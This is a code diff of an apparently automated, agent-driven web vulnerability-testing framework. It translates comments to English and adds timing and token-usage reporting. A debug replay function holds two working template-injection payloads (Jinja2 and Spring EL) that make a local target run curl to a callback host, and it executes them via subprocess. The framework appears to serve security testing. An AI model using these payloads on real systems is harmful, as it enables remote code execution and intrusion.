         vulnerabilities = sum(
             1 for r in execution_results
             if r.get('result', {}).get('vulnerable') is True
         )
 
-        # 更新状态
+        # Update state
         self.state["attack_planning_complete"] = True
         self.state["attack_execution_complete"] = True
         self.state["attacks_planned"] = len(execution_results)
@@ -687,41 +706,48 @@ class HighLevelDecisionAgent:
         self._save_state()
 
         phase_duration = time.time() - phase_start
-        self.phase_times["phase_4_5_pipeline"] = phase_duration
 
-        self._log(f"\n[阶段4+5完成] 发现漏洞: {vulnerabilities}")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
-        self._log(f"💡 性能提升: 使用流水线并行模式大幅缩短测试时间")
+        # Read phase-specific times from executor, separate attack execution and patrol
+        patrol_duration = getattr(self.executor, '_phase2_duration', 0)
 
-        # 保存结果供报告使用
+        self.phase_times["phase_4_5_attack"] = attack_duration  # Override with Phase 1 precise time
+        self.phase_times["phase_4_5_patrol"] = patrol_duration
+
+        self._log(f"\n[Phase 4+5 Complete] Vulnerabilities found: {vulnerabilities}")
+        self._log(f"⏱️  Attack planning+execution duration: {attack_duration:.1f}s")
+        self._log(f"⏱️  Stored vulnerability patrol duration: {patrol_duration:.1f}s")
+        self._log(f"⏱️  Total duration: {phase_duration:.1f}s")
+        self._log(f"💡 Performance improvement: Pipeline parallel mode significantly reduces testing time")
+
+        # Save results for report use
         self.execution_results = execution_results
 
     def _phase_4_attack_planning(self):
         """
-        ⚠️  已弃用：请使用 _phase_4_5_pipeline_attack()
+        ⚠️  Deprecated: Please use _phase_4_5_pipeline_attack()
 
-        阶段4: 攻击规划（单独执行模式）
+        Phase 4: Attack planning (standalone execution mode)
         """
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段4: 攻击规划（Attack Planning）")
+        self._log("Phase 4: Attack Planning")
         self._log("="*70)
 
-        # 创建AttackPlanningAgent
+        # Create AttackPlanningAgent
         self.attack_planner = AttackPlanningAgent(
             client=self.client,
             crawler=self.crawler,
             account_manager=self.account_manager,
             ctf_description=None,
             default_account="default_account",
-            planning_mode=self.config["attack_planning_mode"]  # 🆕 传入规划模式
+            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
         )
 
-        # 执行攻击规划
+        # Execute attack planning
         result = self.attack_planner.plan_and_execute()
 
-        # 保存结果
+        # Save results
         serialized_tasks = [
             {
                 "task_id": task.task_id,
@@ -736,7 +762,7 @@ class HighLevelDecisionAgent:
         with open(self.dirs["attack_planning"] / "attack_tasks.json", 'w', encoding='utf-8') as f:
             json.dump(serialized_tasks, f, indent=2, ensure_ascii=False)
 
-        # 更新状态
+        # Update state
         self.state["attack_planning_complete"] = True
         self.state["attacks_planned"] = len(result['all_tasks'])
         self.state["current_phase"] = "attack_planning_complete"
@@ -745,25 +771,25 @@ class HighLevelDecisionAgent:
         phase_duration = time.time() - phase_start
         self.phase_times["phase_4_attack_planning"] = phase_duration
 
-        self._log(f"\n[阶段4完成] 生成攻击任务: {len(result['all_tasks'])}")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
+        self._log(f"\n[Phase 4 Complete] Attack tasks generated: {len(result['all_tasks'])}")
+        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
 
-        # 保存attack_planner的结果供后续使用
+        # Save attack_planner results for later use
         self.attack_tasks = result['all_tasks']
 
     def _phase_5_attack_execution(self):
-        """阶段5: 攻击执行（🆕 并行模式）
+        """Phase 5: Attack execution (🆕 parallel mode)
 
-        ⚠️  已弃用：建议使用 _phase_4_5_pipeline_attack() 流水线模式
+        ⚠️  Deprecated: Recommend using _phase_4_5_pipeline_attack() pipeline mode
         """
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段5: 攻击执行（Attack Execution - PARALLEL MODE）")
+        self._log("Phase 5: Attack Execution (PARALLEL MODE)")
         self._log("="*70)
 
-        # 🆕 不再预创建 agent 实例（改为在 AttackExecutor 中按需创建）
-        # 创建AttackExecutor
+        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
+        # Create AttackExecutor
         self.executor = AttackExecutor(
             account_manager=self.account_manager,
             crawler=self.crawler,
@@ -772,28 +798,28 @@ class HighLevelDecisionAgent:
             beacon_base="http://172.17.0.1:9091/",
             log_dir=str(self.dirs["attack_execution"]),
             edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
-            worker_drivers=self.worker_drivers,  # 🆕 传递worker drivers（即使旧方法也支持）
-            chrome_options=self.chrome_options,  # 🆕 传递chrome options
-            initial_url=self.crawler.initial_url,  # 🔧 修复：传递登录后的页面URL（用于登录检查）
-            login_task=self.login_task,          # 🆕 传递login task
-            target_domain=self.target_domain  # ✅ 补上这个关键参数！
+            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers (supported even in old method)
+            chrome_options=self.chrome_options,  # 🆕 Pass chrome options
+            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
+            login_task=self.login_task,          # 🆕 Pass login task
+            target_domain=self.target_domain  # ✅ Add this critical parameter!
         )
 
-        # 🆕 使用并行执行方法
-        self._log(f"\n[并行执行模式] 最大并发数: {self.config['attack_execution_max_workers']}")
-        self._log(f"[任务总数] {len(self.attack_tasks)}")
+        # 🆕 Use parallel execution method
+        self._log(f"\n[Parallel Execution Mode] Max concurrency: {self.config['attack_execution_max_workers']}")
+        self._log(f"[Total Tasks] {len(self.attack_tasks)}")
         execution_results = self.executor.execute_tasks_parallel(
             self.attack_tasks,
             max_workers=self.config["attack_execution_max_workers"]
         )
 
-        # 统计漏洞
+        # Count vulnerabilities
         vulnerabilities = sum(
             1 for r in execution_results
             if r.get('result', {}).get('vulnerable') is True
         )
 
-        # 更新状态
+        # Update state
         self.state["attack_execution_complete"] = True
         self.state["vulnerabilities_found"] = vulnerabilities
         self.state["current_phase"] = "attack_execution_complete"
@@ -802,25 +828,25 @@ class HighLevelDecisionAgent:
         phase_duration = time.time() - phase_start
         self.phase_times["phase_5_attack_execution"] = phase_duration
 
-        self._log(f"\n[阶段5完成] 发现漏洞: {vulnerabilities}")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
-        self._log(f"💡 性能提升: 使用并行模式大幅缩短测试时间")
+        self._log(f"\n[Phase 5 Complete] Vulnerabilities found: {vulnerabilities}")
+        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
+        self._log(f"💡 Performance improvement: Parallel mode significantly reduces testing time")
 
-        # 保存结果供报告使用
+        # Save results for report use
         self.execution_results = execution_results
 
     def _generate_final_report(self):
-        """生成最终报告"""
+        """Generate final report"""
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("生成最终报告")
+        self._log("Generate Final Report")
         self._log("="*70)
 
-        # 计算总时间
+        # Calculate total time
         total_duration = sum(self.phase_times.values())
 
-        # 构建报告
+        # Build report
         report = {
             "metadata": {
                 "target_url": self.initial_url,
@@ -841,6 +867,7 @@ class HighLevelDecisionAgent:
                 "total_seconds": total_duration,
                 "phases": self.phase_times
             },
+            "token_usage": tracker.get_summary(),
             "accounts": [
                 {
                     "account_id": acc.account_id,
@@ -851,42 +878,53 @@ class HighLevelDecisionAgent:
             ] if self.account_manager else []
         }
 
-        # 保存报告
+        # Save report
         report_path = self.output_dir / "final_report.json"
         with open(report_path, 'w', encoding='utf-8') as f:
             json.dump(report, f, indent=2, ensure_ascii=False)
 
+        # Additionally save token usage file separately (for easy reference)
+        token_usage_path = self.output_dir / "token_usage.json"
+        with open(token_usage_path, 'w', encoding='utf-8') as f:
+            json.dump(report["token_usage"], f, indent=2, ensure_ascii=False)
+
+        # Print token usage summary to console
+        tracker.print_summary()
+
+        # Mark that token data has been saved by this function; _cleanup does not need to save again
+        self._final_report_saved = True
+
         phase_duration = time.time() - phase_start
         self.phase_times["report_generation"] = phase_duration
 
-        self._log(f"\n[报告生成完成] 报告已保存: {report_path}")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
+        self._log(f"\n[Report Generation Complete] Report saved: {report_path}")
+        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
 
 
     def _debug_replay_commands(self):
         """
-        Debug函数：重放指定的curl命令（用于测试）
+        Debug function: replay specified curl commands (for testing).
 
-        使用方法：
-        1. 修改 debug_commands 列表中的命令
-        2. 在 run() 中的爬取前调用此函数
-        3. 不需要时直接注释掉调用即可
+        Usage:
+        1. Modify the commands in the debug_commands list
+        2. Call this function before crawling in run()
+        3. Simply comment out the call when not needed
         """
         self._log("\n" + "="*70)
         self._log("[DEBUG] Replaying Commands")
         self._log("="*70)
 
-        # ✅ 在这里定义要重放的命令列表
+        # ✅ Define the list of commands to replay here
         debug_commands = [
         "curl -s 'http://127.0.0.1:4288/Users/{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl http://172.17.0.1:9091/?data=loudongyanzheng').read()}}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
         "curl -s 'http://127.0.0.1:4288/Users/${T(java.lang.Runtime).getRuntime().exec('curl http://172.17.0.1:9091/?data=loudongyanzheng')}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
         ]
 
-        # ✅ 类型检查：确保每个元素都是字符串
+        # ✅ Type check: ensure each element is a string
         flattened_commands = []
         for item in debug_commands:
             if isinstance(item, list):
-                # 如果是嵌套列表，展开
+                # If nested list, flatten it
                 flattened_commands.extend(item)
             elif isinstance(item, str):
                 flattened_commands.append(item)
@@ -897,7 +935,7 @@ class HighLevelDecisionAgent:
             self._log("[DEBUG] ✗ No valid commands after flattening")
             return
 
-        # 获取 default_account 的凭证
+        # Get credentials from default_account
         if not self.account_manager:
             self._log("[DEBUG] ✗ AccountManager not initialized")
             return
@@ -910,13 +948,13 @@ class HighLevelDecisionAgent:
         self._log(f"[DEBUG] ✓ Credentials obtained for default_account")
         self._log(f"[DEBUG] Replaying {len(flattened_commands)} command(s)\n")
 
-        # 导入必要的函数
+        # Import necessary functions
         from attack_agent.request_utils import append_credentials_to_curl
         import subprocess
 
-        # 执行每个命令
+        # Execute each command
         for idx, cmd in enumerate(flattened_commands, 1):
-            # ✅ 再次确认类型
+            # ✅ Confirm type again
             if not isinstance(cmd, str):
                 self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}] ✗ Invalid type: {type(cmd)}, skipping")
                 continue
@@ -925,7 +963,7 @@ class HighLevelDecisionAgent:
             cmd_preview = cmd[:100] + "..." if len(cmd) > 100 else cmd
             self._log(f"  Original: {cmd_preview}")
 
-            # 添加凭证
+            # Add credentials
             try:
                 cmd_with_creds = append_credentials_to_curl(cmd, credentials)
                 creds_preview = cmd_with_creds[:150] + "..." if len(cmd_with_creds) > 150 else cmd_with_creds
@@ -934,7 +972,7 @@ class HighLevelDecisionAgent:
                 self._log(f"  ✗ Failed to add credentials: {e}")
                 continue
 
-            # 执行命令
+            # Execute command
             try:
                 process = subprocess.Popen(
                     cmd_with_creds,
@@ -968,165 +1006,186 @@ class HighLevelDecisionAgent:
 
     def _test_create_cloned_drivers(self):
         """
-        测试函数：验证独立driver的创建和状态克隆
+        Test function: verify independent driver creation and state cloning.
 
-        测试步骤：
-        1. 获取主driver当前URL（登录后的URL）
-        2. 创建3个独立driver
-        3. 让每个独立driver访问主driver的当前URL
-        4. 截图验证是否都能正确访问（无需重新登录）
-        5. 清理所有独立driver
+        Test steps:
+        1. Get main driver's current URL (post-login URL)
+        2. Create 3 independent drivers
+        3. Have each independent driver visit the main driver's current URL
+        4. Take screenshots to verify all can access correctly (without re-login)
+        5. Clean up all independent drivers
 
-        使用方法：
-        - 在 run() 中的阶段1之后调用此函数
-        - 检查截图确认登录状态是否正确克隆
-        - 验证无误后可以注释掉
+        Usage:
+        - Call this function after Phase 1 in run()
+        - Check screenshots to confirm login state was correctly cloned
+        - Comment out after verification
         """
         self._log("\n" + "="*70)
-        self._log("[TEST] 测试独立Driver创建")
+        self._log("[TEST] Testing independent driver creation")
         self._log("="*70)
 
-        # 导入ParallelDriverManager
+        # Import ParallelDriverManager
         try:
             from parallel.parallel_driver_manager import ParallelDriverManager
         except ImportError as e:
-            self._log(f"[TEST] ✗ 导入失败: {e}")
-            self._log("[TEST] 请确保 parallel/parallel_driver_manager.py 文件存在")
+            self._log(f"[TEST] ✗ Import failed: {e}")
+            self._log("[TEST] Please ensure parallel/parallel_driver_manager.py exists")
             return
 
-        # 检查主driver和account_manager
+        # Check main driver and account_manager
         if not self.driver:
-            self._log("[TEST] ✗ 主driver未初始化")
+            self._log("[TEST] ✗ Main driver not initialized")
             return
 
         if not self.account_manager:
-            self._log("[TEST] ✗ AccountManager未初始化")
+            self._log("[TEST] ✗ AccountManager not initialized")
             return
 
-        # 获取主driver当前URL
+        # Get main driver current URL
         current_url = self.driver.current_url
-        self._log(f"[TEST] 主driver当前URL: {current_url}")
+        self._log(f"[TEST] Main driver current URL: {current_url}")
 
-        # 创建测试截图目录
+        # Create test screenshot directory
         test_screenshot_dir = self.output_dir / "test_parallel_drivers"
         test_screenshot_dir.mkdir(parents=True, exist_ok=True)
-        self._log(f"[TEST] 截图保存目录: {test_screenshot_dir}")
+        self._log(f"[TEST] Screenshot save directory: {test_screenshot_dir}")
 
-        # 主driver截图（作为对比基准）
+        # Main driver screenshot (comparison baseline)
         main_screenshot_path = test_screenshot_dir / "00_main_driver.png"
         try:
             self.driver.save_screenshot(str(main_screenshot_path))
-            self._log(f"[TEST] ✓ 主driver截图已保存: {main_screenshot_path.name}")
+            self._log(f"[TEST] ✓ Main driver screenshot saved: {main_screenshot_path.name}")
         except Exception as e:
-            self._log(f"[TEST] ⚠️ 主driver截图失败: {e}")
+            self._log(f"[TEST] ⚠️ Main driver screenshot failed: {e}")
 
-        # 创建ParallelDriverManager
-        self._log(f"\n[TEST] 创建ParallelDriverManager...")
+        # Create ParallelDriverManager
+        self._log(f"\n[TEST] Creating ParallelDriverManager...")
         try:
             manager = ParallelDriverManager(
                 account_manager=self.account_manager,
                 base_url=self.initial_url,
                 chrome_options=self.chrome_options,
-                target_domain=self.target_domain  # 🆕 添加这一行
+                target_domain=self.target_domain
             )
-            self._log(f"[TEST] ✓ ParallelDriverManager创建成功")
+            self._log(f"[TEST] ✓ ParallelDriverManager created successfully")
         except Exception as e:
-            self._log(f"[TEST] ✗ ParallelDriverManager创建失败: {e}")
+            self._log(f"[TEST] ✗ ParallelDriverManager creation failed: {e}")
             import traceback
             self._log(traceback.format_exc())
             return
 
-        # 测试创建3个独立driver
+        # Test creating 3 independent drivers
         test_drivers = []
         num_drivers = 3
 
-        self._log(f"\n[TEST] 开始创建 {num_drivers} 个独立driver...\n")
+        self._log(f"\n[TEST] Creating {num_drivers} independent drivers...\n")
 
         for i in range(1, num_drivers + 1):
             self._log(f"{'='*60}")
-            self._log(f"[TEST] 创建第 {i} 个独立driver")
+            self._log(f"[TEST] Creating independent driver #{i}")
             self._log(f"{'='*60}")
 
             try:
-                # 创建克隆driver
+                # Create cloned driver
                 cloned_driver = manager.create_cloned_driver("default_account")
                 test_drivers.append(cloned_driver)
 
-                # 访问主driver当前的URL
-                self._log(f"[TEST Driver-{i}] 访问目标URL: {current_url}")
+                # Navigate to main driver's current URL
+                self._log(f"[TEST Driver-{i}] Navigating to target URL: {current_url}")
                 cloned_driver.get(current_url)
-                time.sleep(1.0)  # 等待页面加载
+                time.sleep(1.0)  # wait for page to load
 
                 actual_url = cloned_driver.current_url
-                self._log(f"[TEST Driver-{i}] 实际URL: {actual_url}")
+                self._log(f"[TEST Driver-{i}] Actual URL: {actual_url}")
 
-                # 检查是否被重定向到登录页
+                # Check if redirected to login page
                 if 'login' in actual_url.lower() and 'login' not in current_url.lower():
-                    self._log(f"[TEST Driver-{i}] ⚠️ 警告：被重定向到登录页！")
-                    self._log(f"[TEST Driver-{i}] 这可能意味着登录状态未正确克隆")
+                    self._log(f"[TEST Driver-{i}] ⚠️ Warning: redirected to login page!")
+                    self._log(f"[TEST Driver-{i}] This may mean login state was not correctly cloned")
                 else:
-                    self._log(f"[TEST Driver-{i}] ✓ URL正确，未被重定向")
+                    self._log(f"[TEST Driver-{i}] ✓ URL correct, not redirected")
 
-                # 截图
+                # Take screenshot
                 screenshot_path = test_screenshot_dir / f"0{i}_cloned_driver_{i}.png"
                 cloned_driver.save_screenshot(str(screenshot_path))
-                self._log(f"[TEST Driver-{i}] ✓ 截图已保存: {screenshot_path.name}")
+                self._log(f"[TEST Driver-{i}] ✓ Screenshot saved: {screenshot_path.name}")
 
-                self._log(f"[TEST Driver-{i}] ✅ 第 {i} 个driver测试完成\n")
+                self._log(f"[TEST Driver-{i}] ✅ Driver #{i} test complete\n")
 
             except Exception as e:
-                self._log(f"[TEST Driver-{i}] ✗ 失败: {e}")
+                self._log(f"[TEST Driver-{i}] ✗ Failed: {e}")
                 import traceback
                 self._log(traceback.format_exc())
 
-        # 汇总测试结果
+        # Summarize test results
         self._log(f"\n{'='*70}")
-        self._log(f"[TEST] 测试汇总")
+        self._log(f"[TEST] Test summary")
         self._log(f"{'='*70}")
-        self._log(f"成功创建的driver数量: {len(test_drivers)}/{num_drivers}")
-        self._log(f"截图保存位置: {test_screenshot_dir}")
-        self._log(f"\n请检查以下截图文件:")
-        self._log(f"  - 00_main_driver.png (主driver，对比基准)")
+        self._log(f"Successfully created drivers: {len(test_drivers)}/{num_drivers}")
+        self._log(f"Screenshot location: {test_screenshot_dir}")
+        self._log(f"\nPlease check the following screenshot files:")
+        self._log(f"  - 00_main_driver.png (main driver, comparison baseline)")
         for i in range(1, len(test_drivers) + 1):
-            self._log(f"  - 0{i}_cloned_driver_{i}.png (独立driver {i})")
+            self._log(f"  - 0{i}_cloned_driver_{i}.png (independent driver {i})")
 
-        # 清理所有独立driver
-        self._log(f"\n[TEST] 清理独立driver...")
+        # Clean up all independent drivers
+        self._log(f"\n[TEST] Cleaning up independent drivers...")
         manager.cleanup_all()
 
         self._log(f"{'='*70}")
-        self._log(f"[TEST] 测试完成！")
+        self._log(f"[TEST] Test complete!")
         self._log(f"{'='*70}\n")
 
-        # 重要提示
-        self._log("⚠️  重要：请检查截图文件，确认以下内容:")
-        self._log("   1. 所有截图的页面内容是否一致？")
-        self._log("   2. 独立driver是否显示登录后的页面（而非登录页）？")
-        self._log("   3. 是否有任何错误提示或异常页面？")
-        self._log("\n   如果所有截图都正常，说明独立driver状态克隆成功！\n")
+        # Important notes
+        self._log("⚠️  Important: check screenshot files and confirm the following:")
+        self._log("   1. Is the page content consistent across all screenshots?")
+        self._log("   2. Do independent drivers show the post-login page (not the login page)?")
+        self._log("   3. Are there any error messages or abnormal pages?")
+        self._log("\n   If all screenshots look correct, independent driver state cloning succeeded!\n")
 
     def _cleanup(self):
-        """清理资源"""
-        self._log("\n[清理资源]")
+        """Clean up resources"""
+        self._log("\n[Resource Cleanup]")
 
-        # 🆕 清理worker drivers（Phase 3创建的）
+        # Output per-phase timing summary regardless of normal or interrupted exit
+        if self.phase_times:
+            self._log("\n" + "="*70)
+            self._log("⏱️  Per-phase timing summary")
+            self._log("="*70)
+            for phase, duration in self.phase_times.items():
+                self._log(f"  {phase}: {duration:.1f}s")
+            self._log(f"  Total: {sum(self.phase_times.values()):.1f}s")
+            self._log("="*70)
+
+        # Save token usage regardless of normal or interrupted exit
+        try:
+            if not getattr(self, '_final_report_saved', False):
+                token_usage_path = self.output_dir / "token_usage.json"
+                with open(token_usage_path, 'w', encoding='utf-8') as f:
+                    json.dump(tracker.get_summary(), f, indent=2, ensure_ascii=False)
+                self._log(f"[Cleanup] Token usage saved: {token_usage_path}")
+                tracker.print_summary()
+        except Exception as e:
+            self._log(f"[Cleanup] Failed to save token usage: {e}")
+
+        # Clean up worker drivers (created in Phase 3)
         if self.worker_drivers:
-            self._log(f"清理 {len(self.worker_drivers)} 个worker drivers...")
+            self._log(f"Cleaning up {len(self.worker_drivers)} worker drivers...")
             for i, worker_driver in enumerate(self.worker_drivers, 1):
                 try:
-                    # 检查是否是主driver（主driver由下面单独处理）
+                    # Check if this is the main driver (handled separately below)
                     if worker_driver != self.driver:
                         worker_driver.quit()
-                        self._log(f"  [{i}/{len(self.worker_drivers)}] Worker driver已关闭")
+                        self._log(f"  [{i}/{len(self.worker_drivers)}] Worker driver closed")
                     else:
-                        self._log(f"  [{i}/{len(self.worker_drivers)}] 主driver（跳过，下面单独处理）")
+                        self._log(f"  [{i}/{len(self.worker_drivers)}] Main driver (skipped, handled below)")
                 except Exception as e:
-                    self._log(f"  [{i}/{len(self.worker_drivers)}] 关闭失败: {e}")
+                    self._log(f"  [{i}/{len(self.worker_drivers)}] Close failed: {e}")
 
-        # 关闭主driver
+        # Close main driver
         if self.driver:
             try:
                 self.driver.quit()
-                self._log("主driver已关闭")
+                self._log("Main driver closed")
             except Exception as e:
-                self._log(f"主driver关闭失败: {e}")
+                self._log(f"Main driver close failed: {e}")
